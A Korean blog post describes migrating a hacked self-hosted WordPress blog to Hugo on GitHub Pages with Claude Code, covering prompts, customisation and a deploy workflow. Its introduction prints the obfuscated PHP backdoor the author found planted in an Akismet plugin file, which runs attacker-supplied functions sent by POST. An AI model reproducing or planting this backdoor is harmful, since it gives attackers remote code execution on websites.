---
title: "Claude Code와 함께한 워드프레스에서 Hugo로의 블로그 마이그레이션"
slug: "워드프레스-Hugo-마이그레이션"
date: 2025-07-14T00:00:00+09:00
categories:
  - 웹 개발
  - 워드프레스 개발
tags:
  - wordpress
  - hugo
  - migration
  - claude code
  - GitHub Pages
---

## 더 이상 참을 수 없었던 셀프호스팅 워드프레스의 한계

셀프 호스팅 워드프레스를 버전 업데이트 없이 너무 오래 방치했더니 나도 모르게 취약점에 의해 악의적인 코드가 주입되어 간헐적으로 이상한 웹사이트로 리디렉션된다는 사실을 최근에 파악했다.
처음에는 악성 크롬 익스텐션이나 다른 스크립트 문제인 줄 알았는데, 알고보니 워드프레스 자체에 악성 코드가 삽입되어 있었던 것이다.

공식 플러그인 중 하나인 akismet의 파일 중 하나에 이런 코드가 심어져있었다. 어떤 취약점을 통해 이렇게 된 것인지 까지는 파악 실패했으나
얼핏 봐도 수상하길래 ChatGPT에 물어보니 공격자가 나중에 POST로 원하는 명령을 보내서 동적으로 코드 실행이 가능한 백도어라고 한다.

```php
<?php
$hello_dolly[]='b585aaea022f1529';
$hello_dolly[]=$_POST;
$hello_dolly[]='color';
if (isset($hello_dolly[1][$hello_dolly[0]])) {
       $dolly = $hello_dolly[1][$hello_dolly[2]]($hello_dolly[1]['theme']($hello_dolly[1][$hello_dolly[0]]));
       $dolly['themes'] = $dolly['theme']();
       $dolly['footer'] = $dolly['footer']($dolly['themes'])[$dolly['name']];
       $dolly['body']($dolly['themes'], $dolly['color']($dolly['header']));
       require_once($dolly['footer']);
       $dolly['size']($dolly['themes']);
}
?>
```

매번 워드프레스와 설치된 플러그인들 버전 호환성을 봐가면서 업그레이드하는 것이 번거롭다보니 버전업을 자꾸 더 미루다가 결국 문제가 발생한 것이다.
게다가 워드프레스 최신 버전에서 글 작성에 사용되는 블록 기반 에디터가 오히려 예전처럼 마크다운으로 글을 작성하는 것보다 불편해서 마음에 들지 않았다.

그래서 이 기회에 취약점도 없고 서버 비용 절감도 할 겸 속도가 빠른 정적 페이지 기반의 웹페이지 빌더 방식으로 블로그를 갈아타려고 마음을 먹었다.
이 생각은 몇년 전부터 계속 하고 있었으나, 기존에는 이것 저것 새로 설정할 것들이 많다보니 시간이 오래걸릴 것 같아 쉽게 마이그레이션 할 엄두가 나지 않았다.
하지만 지난 달 부터 코드 작성을 하는데 Claude Code를 잘 사용중이었고, 이걸 이용하면 하루정도면 마이그레이션을 할 수 있지 않을까? 생각했다. 그저께 실제로 행동에 옮겼고, 정말로 24시간 안에 아래처럼 완벽하게 마이그레이션을 완료할 수 있었다.

{{< responsive-img src="legacy-letmecompile-com.png" alt="리뉴얼 전 letmecompile.com 스크린샷" show-caption="true" >}}
{{< responsive-img src="renewal-letmecompile-com.png" alt="리뉴얼 후 letmecompile.com 스크린샷" show-caption="true" >}}


## 프레임워크 선택: 왜 Hugo인가?

정적 사이트 생성기로는 Hugo, Gatsby, Astro 등 여러 선택지가 있었다. JavaScript toolchain에 더 익숙하긴 하지만 매번 npm 설치하는 것이 귀찮았고, 쾌적한 블로그 글쓰기 경험을 위해 간소화된 툴링 설정과 빠른 빌드/배포 속도를 중요하게 생각했다.

그러다보니 Go 기반의 single native binary 덕분에 설치도 간단하고 빠른 사이트 빌드 속도를 가진 Hugo를 선택했다.
Go template engine이 익숙하지 않은데다 verbose한 편이라 약간 마음에 안들었지만 어차피 이젠 생성형 AI의 시대라 물어봐서 금방 원하는 코드를 생성 할 수 있으니 무시 가능한 수준이었다.

무엇보다 Hugo의 [PaperMod Theme](https://themes.gohugo.io/themes/hugo-papermod/)이 상당히 마음에 들었다. 깔끔하고 모던한 디자인에 다크모드 지원, 그리고 SEO 최적화까지 기본으로 되어있어서 추가 작업이 거의 필요 없었다.

## 마이그레이션 과정: Claude Code가 해결한 모든 것들

### 요구 사항 정의

실제 마이그레이션을 시작하기 전에 다음과 같은 요구 사항들을 정리했다:

- 오래된 블로그라서 예전에 모든 글의 source가 markdown형식이 아니고 raw HTML 버전도 섞여있음
- 디바이스의 디스플레이 크기/해상도에 맞게 이미지 최적화가 자동으로 수행되어야함
- SEO를 유지하기위해 대부분의 permalink url을 워드프레스와 동일한 형식으로 유지해야함

### 첫 번째 프롬프트

위 요구사항을 바탕으로 클로드 코드에게 전달할 프롬프트를 작성했다. 조금이라도 더 좋은 결과물을 얻기위해 코딩 관련 프롬프트는 항상 영어로 작성하는 편이다.

```
I want to migrate my self-hosted wordpress blog into new blog with hugo.
(I currently have full database access to the existing wordpress blog)

- posts & uploaded images
    - some of posts are written in markdown
    - some of posts are written in raw HTML
- categories
- tags
- keep existing permalink and url structures
    - For example,
    - post: https://www.letmecompile.com/manage-aws-resources-with-pulumi-iac/
    - catgory: https://www.letmecompile.com/category/javascript/
    - tags: https://www.letmecompile.com/tag/kubernetes/
- Apply similar SEO strategy used in WP's All In One SEO Pack 
    - the way of extracting title/description from a post for SEO
    - sitemap generation: https://www.letmecompile.com/sitemap.xml

If there's a tool for this you can recommend first then, use it after i confirm it.
but if there are no available tools, write a custom migration script.
```

### Claude Code가 수행한 주요 작업들

[Git 히스토리](https://github.com/yjiq150/letmecompile.com/commits/main/)를 통해서 볼 수 있는 실제 마이그레이션 과정은 다음과 같다:

**1. 초기 설정 및 구조 구축**
- Hugo와 PaperMod 테마 초기 설정
- WordPress와 유사한 URL 구조 설정  
- 기본 설정 파일들 구성

**2. 데이터 마이그레이션**
- [wordpress-to-hugo-exporter 플러그인](https://github.com/SchumacherFM/wordpress-to-hugo-exporter)을 이용한 WordPress 글 임포트
- 이미지 URL 교체 및 최적화
- 카테고리와 태그 구조 재구성

**3. 디자인 및 기능 구현**
- 코드 하이라이트 적용
- 이미지 비율 유지를 위한 CSS 오버라이드
- 검색 메뉴 추가
- 프로필 모드 설정

**4. SEO 및 최적화**
- OpenGraph 메타태그 수정
- 사이트맵 생성 설정
- 지역화(localization) 수정
- 헤더 로고 추가

**5. 댓글 시스템 및 애널리틱스**
- Disqus 댓글 시스템 연동
- Google Analytics 설정
- AdSense 자동 삽입 기능


### PaperMod 테마 커스터마이징의 소소한 에피소드

PaperMod Theme을 커스터마이즈하는 과정에서 Claude Code가 자꾸 중복 HTML/CSS를 생성하는걸 여러번 뜯어말렸다. 
예를 들어 같은 스타일을 여러 파일에 중복으로 작성하거나, 이미 존재하는 클래스를 또다시 정의하려고 하는 경우가 있었다.

사실 결과물이 만족스럽고, 내가 코드베이스를 항상 수동으로 수정하는게 아니라면 AI가 중복 코드 생성하는걸 뜯어말려서 코드 퀄리티를 올리는게 그렇게 의미가 있나 싶지만 10년넘게 몸에 밴 습관을 어찌 하기 힘들어서 결국 중복코드를 제거해달라고 요청했다. (요청만 명확히 하면 말을 잘 듣긴하는듯ㅎㅎ)

## 배포: 서버 비용 완전 제거

원래 블로그는 2013년 정도에 구축한거라 LAMP 스택 + AWS t4g.micro 서버 인스턴스에서 돌리고있었다.

정적 웹사이트로 바꾼 덕분에 더이상 서버 인스턴스를 쓰지 않아도 되는 장점이 생겼다. GitHub Pages, Netlify, Vercel, Cloudflare 등을 검토하다가, 저장소/배포를 동일한 서비스에서 간편하게 할 수 있는 GitHub Pages로 선택했다.
평소에 트래픽이 좀 많은 정적 사이트를 운영할 때는 Cloudflare CDN + R2 를 사용해서 100GB 이상의 트래픽이 발생하더라도 거의 트래픽 비용 없이 운영하는데,
개인 블로그는 트래픽이 어차피 크지 않을거라 생각해서 GitHub Pages에서 제공하는 100GB도 충분해 보였다. 

게다가 평소에 GitHub Actions을 거의 써보지 않아서 설정하기 힘들 줄 알았는데 Claude Code와 한두번 핑퐁해서 아래 스크립트를 생성했고 이걸로 배포까지 손쉽게 잘 되었다.

```yaml
name: Deploy Hugo site to GitHub Pages

on:
  push:
    branches:
      - main # Set a branch to deploy
  pull_request:
  workflow_dispatch: # Allows manual triggering

jobs:
  # Build job
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          submodules: true # Fetch Hugo themes (true OR recursive)
          fetch-depth: 0   # Fetch all history for .GitInfo and .Lastmod

      - name: Setup Hugo
        uses: peaceiris/actions-hugo@v2
        with:
          hugo-version: '0.148.1'
          extended: true

      - name: Build
        run: hugo --minify

      - name: Upload Pages artifact
        uses: actions/upload-pages-artifact@v3 # This action uploads the built site as an artifact
        with:
          path: ./public # The directory containing your static site files

  # Deploy job
  deploy:
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    runs-on: ubuntu-latest
    needs: build # This job depends on the 'build' job
    permissions:
      pages: write # Required for actions/deploy-pages
      id-token: write # Required for OpenID Connect (OIDC) which is often used for Pages
    if: github.ref == 'refs/heads/main' # Only deploy from main branch

    steps:
      - name: Deploy to GitHub Pages
        id: deployment
        uses: actions/deploy-pages@v4 # This action deploys the uploaded artifact
```

GitHub Actions를 통한 자동 배포 설정도 Claude Code가 알아서 처리해줘서 정말 편했다. 이제 로컬에서 새 글을 쓰고 `git push`만 하면 자동으로 빌드되고 배포된다. 
글이 140개에 이미지가 꽤 많아서 아티팩트 용량이 100MB 정도 되는데도 push 직후 배포까지 30초 정도 소요된다.

{{< responsive-img src="github-actions-hugo-deploy.png" alt="GitHub Actions 자동 배포 워크플로우" show-caption="true" >}}

## 24시간 만에 완성된 마이그레이션의 의미

AI agent의 도움 없이 작업했다면 일주일 가까이 걸렸을 작업을 24시간 내에 완벽하게 처리할 수 있었다.
가장 좋았던 점은 AI agent가 일 시켜놓고 나는 유튜브를 볼 수 있었다는 것이다.
물론 중간중간 방향을 잡아주거나 요구사항을 명확히 하는 작업은 필요했지만, 대부분의 반복적이고 번거로운 작업들은 AI가 처리해줬다.

아직 그래도 AI가 종종 문제 해결을 못하고 뱅뱅 도는 경우가 있어서 때문에 충분한 개발 지식이 없는 사람들은 이럴때 해결이 어려울 수 있다.
예를 들어 설정 파일의 문법 오류나 CSS 충돌, 이미지 경로 문제 등은 여전히 사람이 판단하고 수정해야 하는 부분들이 있었다.

어쨌건 블로그 리뉴얼 후 속도도 빠르고 디자인과 글 작성 흐름 또한 매우 만족스러워서 지금 이 글을 쓰고있다.
앞으로는 블로그 글도 AI를 이용해서 쓸 예정인데  심지어 이 글도 `어떻게 쓸지 가이드용 프롬프트 작성 -> AI에게 작성 요청 -> 다듬기` 순서로 작성된 글이다 😀

다음은 실제 사용한 프롬프트이다.

```markdown
블로그 글을 워드프레스에서 Hugo로 마이그레이션 하는 과정에 대한 글을 하나 작성하려고해. 다음과 같은 내용인데 아래 조건에 맞게 잘 작성해줘
- 
- contents/posts 에 markdown 형식으로 작성해서 넣어줘
- 말투는 기존 블로그 다른 글을 2-3개 정도 참고해서 작성해줘
- 서론/본론/결론 부분에 대한 적당한 제목을 만들어서 넣어줘
- 적당히 이미지가 필요할 것 같은 부분이 있다면 설명과 함께 placeholder를 만들어줘. 나중에 내가 다시 보고 채워넣을게

## 글 내용

### 서론
- 셀프 호스팅 워드프레스를 버전 업데이트 없이 너무 오래 방치했더니 나도 모르게 취약점에 의해 악의적인 코드가 주입되어 간헐적으로 이상한 웹사이트로 리디렉션된다는 사실을 최근에 파악
- 매번 워드프레스와 그 플러그인들 버전업 하는 부분이 번거롭고 관리가 어려웠고, 워드프레스 최신버전의 글 작성에 사용되는 에디터 마음에 들지 않았음.
- 그래서 이 기회에 취약점도 없고 서버 비용 절감도 절감할 겸 속도가 빠른 정적 페이지 기반의 웹페이지 빌더 방식으로 블로그를 갈아타고 싶었음
- 이 문제는 몇년 전부터 인지하고 있었으나, 이것 저것 새로 설정할 것들이 많다보니 쉽게 마이그레이션 할 엄두가 나지 않음
- 지난달 부터 코드 작성을 하는데 Claude Code 를 잘 사용중이었고, 이걸 이용하면 하루정도면 마이그레이션을 할 수 있지 않을까? 생각함
- 그저께 실제로 행동에 옮김

### 본론

#### 프레임워크 선택
- hugo vs. gatsby vs. astro
- javascript toolchain에 더 익숙하긴 하지만 매번 npm 설치가 귀찮았음
- go 기반의 single native binary 덕분에 설치도 간단하고 빠른 사이트 빌드 속도를 가진 hugo 선택
- go template engine이 익숙하지 않은데다 verbose한 편이라 약간 마음에 안들었지만 어차피 이젠 생성형 AI의 시대라 물어봐서 금방 generate 할 수 있어서 무시 가능한 수준
- hugo의 PaperMod Theme이 상당히 마음에 들었음


#### 마이그레이션 과정
- 실제 마이그레이션 과정을 설명
- 요구 사항 정의
    - 오래된 블로그라서 예전에 모든 글의 source가 markdown형식이 아니고 raw HTML 버전도 섞여있음
    - 디바이스의 디스플레이 크기/해상도에 맞게 이미지 최적화가 자동으로 수행되어야함
    - SEO를 유지하기위해 대부분의 permalink url 을 워드프레스와 동일한 형식으로 유지해야함

- 첫번째 프롬프트 내용 (조금이라도 더 좋은 결과물을 얻기위해 코딩 관련 프롬프트는 항상 영어로 작성)
  ... (생략) ...

- 현재 repo의 git history로부터 commit message와 변경 사항들을 보고 해당 작업 내용들을 bullet point로 요약하기 (commit message는 영어지만 글은 한글로 생성할 것)

- PaperMod Theme을 커스터마이즈하는 과정에서 Claude Code가 자꾸 중복 html/css를 생성하는걸 여러번 뜯어말렸음
- 사실 결과물이 만족스럽고, 내가 코드베이스를 항상 수동으로 수정하는게 아니라면 AI가 중복 코드 생성하는걸 뜯어말리는게 그렇게 의미가 있나 싶지만 몸에 밴 습관을 어찌 하기 힘들었음

#### 배포

- 원래 블로그는 2013년 정도에 구축한거라 LAMP 스택 + AWS t4g.micro 서버 인스턴스에서 돌리고있었음 
- 정적 웹사이트로 바꾼 덕분에 더이상 서버 인스턴스를 쓰지 않아도 되는 장점
- Github Pages, Netlify, Vercel 등을 검토하다가, 저장소/배포를 동일한 서비스에서 간편하게 할 수 있는 Github Pages로 선택


### 결론

- AI agent의 도움 없이 작업했다면 일주일 가까이 걸렸을 작업을 24시간 내에 완벽하게 처리
- AI agent가 일 시켜놓고 나는 유튜브 볼 수 있었음
- 아직 그래도 AI가 종종 삽질을 하기 때문에 충분한 개발 지식이 없는 사람들은 이럴때 해결이 어려울 수 있음
- 어찌됐든 블로그 리뉴얼 후 속도도 빠르고 디자인과 글 작성 흐름 또한 매우 만족 스러워서 지금 이 글을 쓰고있음. 툴링이 편해졌으니 앞으로 더 열심히 글을 써보겠음 (글도 AI로..)
```
